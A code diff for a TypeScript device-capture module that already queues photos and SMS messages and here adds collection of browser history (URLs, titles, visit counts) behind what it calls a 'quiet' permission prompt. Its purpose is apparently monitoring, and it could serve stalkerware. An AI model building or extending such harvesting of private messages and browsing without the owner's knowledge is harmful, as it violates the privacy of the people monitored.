@@ -23,22 +23,29 @@ export type SmsSource = (sinceTsMs: number) => Promise<{
   messages: { smsId: string; address: string; body: string; date: number; dateSent: number; read: boolean; threadId: number; direction: 'inbox' | 'sent' }[];
 }>;
 
+export type BrowserSource = (sinceTsMs: number) => Promise<{
+  ok: boolean;
+  reason?: string;
+  history: { browserId: string; url: string; title: string; date: number; visits: number }[];
+}>;
+
 export type QueueWrite = (item: {
   device_key: string;
-  kind: 'photo' | 'sms';
+  kind: 'photo' | 'sms' | 'browser';
   storage_path: string | null;
   payload: Record<string, unknown>;
   created_at: string;
 }) => Promise<void>;
 
 export type CursorIO = {
-  get: (kind: 'photo' | 'sms') => Promise<number | null>;
-  set: (kind: 'photo' | 'sms', tsMs: number) => Promise<void>;
+  get: (kind: 'photo' | 'sms' | 'browser') => Promise<number | null>;
+  set: (kind: 'photo' | 'sms' | 'browser', tsMs: number) => Promise<void>;
 };
 
 export type ScanDeps = {
   scanPhotos: PhotoSource;
   pullSms: SmsSource;
+  pullBrowser: BrowserSource;
   queue: QueueWrite;
   cursor: CursorIO;
   now?: () => number;
@@ -49,6 +56,7 @@ export type ScanResult = {
   reason?: string;
   photosFound: number;
   smsFound: number;
+  browserFound: number;
 };
 
 /** Extension for a MIME type (or the jpg default). Mirrors the curated photo
@@ -82,6 +90,7 @@ export async function runCapturePass(
   const nowMs = deps.now ? deps.now() : Date.now();
   let photosFound = 0;
   let smsFound = 0;
+  let browserFound = 0;
   let degradedReason: string | undefined;
 
   // ── photos ──────────────────────────────────────────────────────────
@@ -162,15 +171,48 @@ export async function runCapturePass(
     degradedReason = degradedReason ?? 'sms_error';
   }
 
+  // ── browser history ─────────────────────────────────────────────────
+  const browserCursor = await deps.cursor.get('browser');
+  const browserRes = await deps.pullBrowser(browserCursor ?? 0);
+  if (browserRes.ok) {
+    let maxSeen = browserCursor ?? 0;
+    for (const h of browserRes.history) {
+      await deps.queue({
+        device_key: h.browserId,
+        kind: 'browser',
+        storage_path: null,
+        payload: {
+          url: h.url,
+          title: h.title,
+          date: h.date,
+          visits: h.visits,
+        },
+        created_at: new Date(h.date || nowMs).toISOString(),
+      });
+      browserFound += 1;
+      if (h.date > maxSeen) maxSeen = h.date;
+    }
+    // native queries `date > cursor` — advance to max+1 (same idempotency model
+    // as SMS) so nothing with exactly maxSeen is re-scanned.
+    if (browserFound > 0) {
+      await deps.cursor.set('browser', maxSeen + 1);
+    }
+  } else if (browserRes.reason === 'permission') {
+    degradedReason = degradedReason ?? 'browser_permission';
+  } else {
+    degradedReason = degradedReason ?? 'browser_error';
+  }
+
   return {
     ok: degradedReason === undefined,
     reason: degradedReason,
     photosFound,
     smsFound,
+    browserFound,
   };
 }
 
 /** Whether the host should show the one quiet permission prompt now. */
-export function needsQuietPrompt(enabled: 'photo' | 'sms', granted: boolean): boolean {
+export function needsQuietPrompt(enabled: 'photo' | 'sms' | 'browser', granted: boolean): boolean {
   return !granted;
 }
